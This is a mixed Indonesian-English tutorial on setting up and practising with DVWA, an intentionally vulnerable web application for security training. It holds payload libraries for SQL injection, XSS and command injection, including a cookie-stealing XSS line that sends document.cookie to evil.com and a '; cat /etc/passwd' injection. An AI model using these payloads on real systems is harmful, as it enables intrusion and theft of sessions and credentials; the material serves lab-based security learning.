# DVWA - Damn Vulnerable Web Application

![DVWA Logo](https://raw.githubusercontent.com/digininja/DVWA/master/images/logo.png)

## 🚀 Apa Itu DVWA?

**DVWA (Damn Vulnerable Web Application)** adalah aplikasi web yang sengaja dibuat vulnerable untuk praktik security testing dan penetration testing. Ini adalah platform #1 untuk belajar web hacking karena:

- **Gratis & Open Source:** Sepenuhnya gratis tanpa batas
- **Multiple Difficulty Levels:** Low, Medium, High, Impossible
- **Real-World Vulnerabilities:** Semua vuln yang ada di OWASP Top 10
- **Learning Focused:** Tidak hanya exploit, tapi juga understand cara prevent
- **Community Support:** Massive community untuk help dan tutorials

## 📋 Fitur DVWA

### Vulnerability Categories
- **SQL Injection** - Classic SQLi attacks
- **XSS (Cross-Site Scripting)** - Reflected & Stored
- **Command Injection** - OS command execution
- **File Inclusion** - LFI/RFI vulnerabilities
- **File Upload** - Unrestricted file upload exploits
- **Brute Force** - Authentication bypass techniques
- **CSRF (Cross-Site Request Forgery)** - Session riding attacks
- **Weak Session Management** - Session handling flaws
- **Security Misconfigurations** - Common config mistakes

### Difficulty Levels
- **LOW:** Basic vulnerabilities, minimal filters
- **MEDIUM:** Added filters dan sanitization
- **HIGH:** Advanced protection mechanisms
- **IMPOSSIBLE:** Current best practices (almost secure)

## 🛠 Installasi DVWA

### Persyaratan Sistem
- **Web Server:** Apache/Nginx
- **Database:** MySQL/MariaDB
- **PHP:** Version 7.0+
- **OS:** Linux/Mac/Windows (XAMPP/LAMP/WAMP)

### Metode 1: Docker (Recommended)
```bash
# Pull DVWA Docker image
docker pull vulnerables/web-dvwa

# Run DVWA container
docker run -d -p 8080:80 vulnerables/web-dvwa

# Access: http://localhost:8080
```

### Metode 2: Manual Installation
```bash
# 1. Clone repository
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa

# 2. Setup database
mysql -u root -p
CREATE DATABASE dvwa;
GRANT ALL ON dvwa.* TO 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
FLUSH PRIVILEGES;
EXIT;

# 3. Configure PHP database settings
cd /var/www/html/dvwa/config/
cp config.inc.php.dist config.inc.php
nano config.inc.php
# Edit file paths and database credentials

# 4. Setup web permissions
chown -R www-data:www-data /var/www/html/dvwa/
chmod -R 755 /var/www/html/dvwa/

# 5. Restart services
sudo systemctl restart apache2
sudo systemctl restart mysql

# Access: http://localhost/dvwa
```

### Initial Setup
1. **First Access:** http://localhost/dvwa
2. **Create Database:** Click "Create Database" button
3. **Default Login:**
   - Username: `admin`
   - Password: `password`

## 🎯 DVWA Learning Roadmap

### Phase 1: Setup & Familiarization (1-2 hari)
1. Install DVWA dengan salah satu metode di atas
2. Login dan explore interface
3. Understand difficulty levels
4. Read documentation untuk each vuln

### Phase 2: Vulnerability Mastery (7-14 hari)

#### Week 1: Basic Web Vulns
**Day 1-2: Brute Force**
- Low: Basic dictionary attack
- Medium: Username enumeration protection
- High: Brute force countermeasures

**Day 3-4: Command Injection**
- Low: Basic OS commands
- Medium: Sanitized inputs
- High: WAF-style protection

**Day 5-7: SQL Injection**
- Union-based injection
- Blind SQL injection
- Error-based injection

#### Week 2: Client-Side Attacks
**Day 8-9: XSS Attacks**
- Reflected XSS: GET/POST parameters
- Stored XSS: Database persistence
- DOM XSS: Client-side JavaScript

**Day 10-11: CSRF**
- Flaws dalam security tokens
- One-click attacks
- Mitigations testing

**Day 12-14: File Handling**
- File Include vulnerabilities
- File Upload bypasses
- Directory traversal attacks

### Phase 3: Advanced Exploitation (3-4 hari)

#### Security Configurations
- Default credentials
- Direct object references
- Session management weaknesses

#### PHP Vulnerabilities
- Magic quotes bypass
- include/require misuse
- Variable injection

### Phase 4: Mastering Difficulty Levels

#### LOW Difficulty Strategy
- Focus on vulnerability identification
- Learn basic exploit techniques
- Understand attack patterns

#### MEDIUM Difficulty Strategy
- Bypass input filters
- Use encoding techniques
- Combine multiple vectors

#### HIGH Difficulty Strategy
- Advanced bypass techniques
- Think like real attackers
- Use creative payloads

## 🛠 Tools Integration with DVWA

### Burp Suite Integration
1. **Proxy Setup:**
   - Open Burp Suite
   - Configure Firefox proxy to 127.0.0.1:8080
   - Enable intercept

2. **SQLi Testing:**
   - Intercept requests with SQL parameters
   - Use Repeater untuk manual testing
   - Apply SQL payloads from SQLMap

3. **XSS Testing:**
   - Inject payloads via POST data
   - Use Intruder untuk bulk testing
   - Check response untuk payload reflection

### SQLMap Automation
```bash
# Basic SQL injection scan
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=your_session"

# More advanced with proxy
sqlmap -u "target_url" --proxy=http://127.0.0.1:8080 --batch
```

### XSS Testing with XSStrike
```bash
# Check for XSS vulnerabilities
python3 xsstrike.py -u "http://localhost/dvwa/vulnerabilities/xss_r/"

# With fuzzing capabilities
python3 xsstrike.py -u "target" --fuzzer --log=log.txt
```

## 📝 DVWA Vulnerability Deep Dives

### SQL Injection Mastery

#### Union-Based SQLi (LOW)
**Payload Examples:**
```
' UNION SELECT null,version() --     # Database version
' UNION SELECT null,user() --        # Current user
' UNION SELECT null,database() --    # Database name
```

**Advanced:**
```
' UNION SELECT table_name,null FROM information_schema.tables --
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --
```

#### Blind SQLi (MEDIUM/HIGH)
**Boolean Based:**
```
' AND IF(version() LIKE '8.%',1,0) --    # Version checking
' AND LENGTH(database())=4 --           # Database name length
```

**Time-Based:**
```
' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0) --
' AND 1=IF((SELECT COUNT(*) FROM users)=1,SLEEP(5),0) --
```

### XSS Payload Library

#### Basic Payloads (LOW)
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<body onload=alert('XSS')>
```

#### Bypass Filters (MEDIUM/HIGH)
```javascript
<sCript>alert('XSS')</sCript>           // Case mixing
<script>/*payload*/alert(1)//</script>  // Comment evade
<svg onload=alert`1`>                   // Template strings
```

#### Advanced Payloads
```javascript
<img src=1 onerror=window.location='http://evil.com?c='+document.cookie>
<iframe src="javascript:alert(1)"></iframe>
<form action="http://evil.com" method="post">
<input type="hidden" name="cookie" value="<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>">
</form>
```

### Command Injection Vectors

#### Basic Commands (LOW)
```
; whoami
; id
; cat /etc/passwd
```

#### Filter Bypass (MEDIUM)
```
ping 127.0.0.1 & whoami      // Background process
ping 127.0.0.1 | whoami      // Pipe chaining
ping 127.0.0.1 && whoami     // AND operator
```

#### Obfuscation (HIGH)
```
`whoami`                      // Backticks execution
$(whoami)                     // Command substitution
$(which python) -c 'import os; os.system("id")'  // Python execution
```

## 🔒 Security Source Code Review

### Understanding DVWA Architecture
1. **Database Structure:** Examine schema untuk understand tables
2. **Authentication:** Review login logic
3. **Input Validation:** Analyze security functions
4. **Session Handling:** Check session management code

### Vulnerability Prevention
Each DVWA example includes "View Source" button - **always analyze and understand why vulnerabilities exist**.

## 📊 Progress Tracking

### Creation Tracker
- [ ] SQL Injection (All difficulties)
- [ ] XSS (All difficulties)
- [ ] Command Injection (All difficulties)
- [ ] File Inclusion (All difficulties)
- [ ] File Upload (All difficulties)
- [ ] Weak Session (All difficulties)
- [ ] Security Misconfig (All difficulties)

### Writeup Template
```
# Vulnerability Name
## Description
## Exploitation Steps
## Mitigation
## Lessons Learned
## Difficulty: Easy/Medium/Hard
```

## 🛠 Troubleshooting Common Issues

### Database Connection Issues
```bash
# Check MySQL status
sudo systemctl status mysql

# Test database connection
mysql -u dvwa -p dvwa << EOF
SELECT * FROM users;
EOF
```

### Permission Errors
```bash
# Fix DVWA permissions
sudo chown -R www-data:www-data /var/www/html/dvwa/
sudo chmod -R 755 /var/www/html/dvwa/
```

### PHP Errors
```bash
# Check PHP error log
sudo tail -f /var/log/apache2/error.log

# Enable error reporting in DVWA configs
error_reporting(E_ALL);
```

## 🌐 Resources & Links

### Official
- **DVWA GitHub:** https://github.com/digininja/DVWA
- **OWASP:** https://owasp.org/www-project-top-ten/

### Learning Platforms
- **OWASP Juice Shop:** Modern web app vulnerabilities
- **CTF Platforms:** HTB, TryHackMe Web sections
- **Books:** "The Web Application Hacker's Handbook"

### Communities
- **DVWA Forums:** Community support
- **OWASP Discord:** Real-time help
- **Reddit r/netsec:** Advanced discussions

## 🎯 Next Steps Setelah DVWA Master

1. **Real Applications:** Test pada personal projects dengan permission
2. **Bug Bounty Programs:** Try very low-hanging fruit bugs first
3. **CTF Challenges:** Bug Bounty style CTFs
4. **Source Code Analysis:** Read expert writeups dan understand mitigations

## 💡 Pro Tips for DVWA Success

1. **Read Source Code:** Always check how vulnerabilities work internally
2. **Burp for All:** Use Burp Proxy untuk setiap test
3. **Document Everything:** Create writeups untuk setiap vuln found
4. **Change Difficulty:** Don't skip levels - each teaches different techniques
5. **Combine Vulnerabilities:** Look for vuln chains untuk higher impact
6. **Learn from Failures:** When stuck, read source code atau Google better
7. **Practice Regularly:** Weekly DVWA sessions keep skills sharp

---

**Goal:** DVWA adalah playground mu. Setelah master semua difficulty levels, kamu siap untuk tackle real-world web applications. Remember: The games get harder, but the real world is much more complex! 🎮🚀
